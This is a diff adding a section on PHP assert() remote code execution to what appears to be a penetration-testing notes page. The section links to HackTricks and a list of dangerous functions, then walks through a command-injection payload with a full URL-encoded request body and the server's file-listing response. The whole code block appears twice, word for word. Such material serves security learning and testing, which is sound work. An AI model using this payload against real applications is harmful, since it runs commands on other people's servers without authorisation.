@@ -208,6 +208,73 @@ php > print_r($results);
 ```
 {% endcode %}
 
+## Dangerous functions
+
+[https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)
+
+## assert (RCE)
+
+[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html?highlight=assert#rce-via-assert](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html?highlight=assert#rce-via-assert)
+
+You will need to **break the code syntax, add your payload, and then fix it again**. You can use logic operations such as "and" or "%26%26" or "|". Note that "or", "||" doesn't work because if the first condition is true our payload won't get executed. The same way ";" doesn't work as our payload won't be executed.
+
+{% code overflow="wrap" fullWidth="true" %}
+```bash
+# Example of assert error
+is_numeric('') !== false
+
+# Since our first condition is false...
+
+# break the code syntax
+x')																'
+# add your payload
+or system('ls')
+# fix it again
+and is_numeric('a																	'
+
+# Join your payload all together
+amount=a') or system('ls') and is_numeric('a
+
+# The whole body parameter would be
+from=Alice&fromaddr=1234%20Main%20St&to=Bob&toaddr=5678%20Elm%20St&amount=a')%20or%20system('ls')%20and%20is_numeric('a&comments=Payment%20for%20July%20rent&cmd=id
+
+# And the response is
+...
+addTransaction.php
+index.php
+license.txt
+script.js
+style.css
+Assertion Failed:<br/>
+            Invalid value for amount<br />
+            At line '23' : 'is_numeric('x') or system('ls') and is_numeric('a') !== false'<br />
+
+# break the code syntax
+x')																'
+# add your payload
+or system('ls')
+# fix it again
+and is_numeric('a																	'
+
+# Join your payload all together
+amount=a') or system('ls') and is_numeric('a
+
+# The whole body parameter would be
+from=Alice&fromaddr=1234%20Main%20St&to=Bob&toaddr=5678%20Elm%20St&amount=a')%20or%20system('ls')%20and%20is_numeric('a&comments=Payment%20for%20July%20rent&cmd=id
+
+# And the response is
+...
+addTransaction.php
+index.php
+license.txt
+script.js
+style.css
+Assertion Failed:<br/>
+            Invalid value for amount<br />
+            At line '23' : 'is_numeric('x') or system('ls') and is_numeric('a') !== false'<br />
+```
+{% endcode %}
+
 ## Commands and functions
 
 ```
